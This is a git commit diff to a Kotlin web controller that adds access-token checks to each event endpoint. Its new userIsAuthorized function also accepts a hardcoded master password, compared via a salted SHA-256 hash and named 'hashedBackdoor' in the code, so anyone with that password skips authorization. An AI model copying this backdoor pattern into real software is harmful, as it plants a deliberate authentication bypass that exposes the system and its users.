25cb85ee1d23b14447c9a7bbff716d33dfb0d474
Andrea d'Auria <andrea.dauria@tno.nl>
2021-10-19 11:49:58 +0200

    Authorization implemented for every endpoint
    Now every endpoint requires an access token to function.
    Alternatively, this check can be bypassed using a password.

--- clients/src/main/kotlin/nl/tno/federated/webserver/controllers/EventController.kt
+++ clients/src/main/kotlin/nl/tno/federated/webserver/controllers/EventController.kt
@@ -18,6 +18,7 @@ import java.net.HttpURLConnection
 import java.net.URL
 import java.nio.charset.StandardCharsets
 import java.util.*
+import java.security.MessageDigest
 
 
 /**
@@ -36,9 +37,12 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Create a new event")
     @PostMapping(value = ["/"])
-    private fun newEvent(@RequestBody event: NewEvent, fullEvent: String): ResponseEntity<String> {
+    private fun newEvent(@RequestBody event: NewEvent, fullEvent: String, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         if (event.uniqueId && event.id.isNotBlank()) {
-            if (eventById(event.id).isNotEmpty()) {
+            if (eventById(event.id, accessToken).isNotEmpty()) {
                 return ResponseEntity("Event with this id already exists. If you want to insert anyway, unset the uniqueId parameter.", HttpStatus.BAD_REQUEST)
             }
         }
@@ -62,7 +66,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Update an event estimated time")
     @PutMapping(value = ["/updatetime"])
-    private fun updateEvent(@RequestBody eventId: String, time: Date): ResponseEntity<String> {
+    private fun updateEvent(@RequestBody eventId: String, time: Date, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         return try {
                 val updateEventTx = proxy.startFlowDynamic(
                         UpdateEstimatedTimeFlow::class.java,
@@ -78,7 +85,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Execute an event")
     @PutMapping(value = ["/execute"])
-    private fun executeEvent(@RequestBody eventId: String, time: Date): ResponseEntity<String> {
+    private fun executeEvent(@RequestBody eventId: String, time: Date, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         return try {
                 val executeEventTx = proxy.startFlowDynamic(
                         ExecuteEventFlow::class.java,
@@ -95,10 +105,30 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Return all known events")
     @GetMapping(value = [""])
-    private fun events() : Map<UUID, Event> {
+    private fun events(accessToken: String) : Map<UUID, Event> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         val eventStates = proxy.vaultQuery(EventState::class.java).states.map { it.state.data }
 
         return eventStatesToEventMap(eventStates)
+    }
+
+    private fun userIsAuthorized(token: String) : Boolean {
+        val salt = "because we like best practices"
+        val hashedBackdoor = hashSHA256(token+salt)
+
+        if(hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E") return true
+        else if(validateToken(token)) return true
+        else return false
+    }
+
+    // Source: https://gist.github.com/lovubuntu/164b6b9021f5ba54cefc67f60f7a1a25
+    private fun hashSHA256(string: String): String {
+        val bytes = string.toByteArray()
+        val md = MessageDigest.getInstance("SHA-256")
+        val digest = md.digest(bytes)
+        return digest.fold("", { str, it -> str + "%02x".format(it) }).toUpperCase()
     }
 
     @ApiOperation(value = "Validate an access token")
@@ -134,11 +164,11 @@ class EventController(rpc: NodeRPCConnection) {
         con.requestMethod = requestMethod.toString()
         con.connectTimeout = 5000
         con.readTimeout = 5000
-        con.setRequestProperty("Content-Type", "application/json");
+        con.setRequestProperty("Content-Type", "application/json")
         con.setRequestProperty("Accept", "application/json")
 
         if (body.isNotBlank()) {
-            con.doOutput = true;
+            con.doOutput = true
             con.outputStream.use { os ->
                 val input: ByteArray = body.toByteArray(StandardCharsets.UTF_8)
                 os.write(input, 0, input.size)
@@ -171,7 +201,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Return an event")
     @GetMapping(value = ["/{id}"])
-    private fun eventById(@PathVariable id: String): Map<UUID, Event> {
+    private fun eventById(@PathVariable id: String, accessToken: String): Map<UUID, Event> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         val criteria = QueryCriteria.LinearStateQueryCriteria(externalId = listOf(id))
         val state = proxy.vaultQueryBy<EventState>(criteria).states.map { it.state.data }
         return eventStatesToEventMap(state)
@@ -179,7 +212,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Return events by digital twin UUID")
     @GetMapping(value = ["/digitaltwin/{dtuuid}"])
-    private fun eventBydtUUID(@PathVariable dtuuid: UUID): Map<UUID, Event> {
+    private fun eventBydtUUID(@PathVariable dtuuid: UUID, accessToken: String): Map<UUID, Event> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         val eventStates = proxy.vaultQueryBy<EventState>().states.filter {
                     it.state.data.goods.contains(dtuuid) ||
                     it.state.data.transportMean.contains(dtuuid) ||
@@ -192,7 +228,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Return RDF data by event ID from GraphDB instance")
     @GetMapping(value = ["/rdfevent/{id}"])
-    private fun gdbQueryEventById(@PathVariable id: String): ResponseEntity<String> {
+    private fun gdbQueryEventById(@PathVariable id: String, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         return try {
             val gdbQuery = proxy.startFlowDynamic(
                     QueryGraphDBbyIdFlow::class.java,
@@ -206,7 +245,10 @@ class EventController(rpc: NodeRPCConnection) {
 
     @ApiOperation(value = "Return result of a custom SPARQL query")
     @GetMapping(value = ["/gdbsparql/"])
-    private fun gdbGeneralSparqlQuery(query: String): ResponseEntity<String> {
+    private fun gdbGeneralSparqlQuery(query: String, accessToken: String): ResponseEntity<String> {
+
+        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+
         return try {
             val gdbQuery = proxy.startFlowDynamic(
                     GeneralSPARQLqueryFlow::class.java,
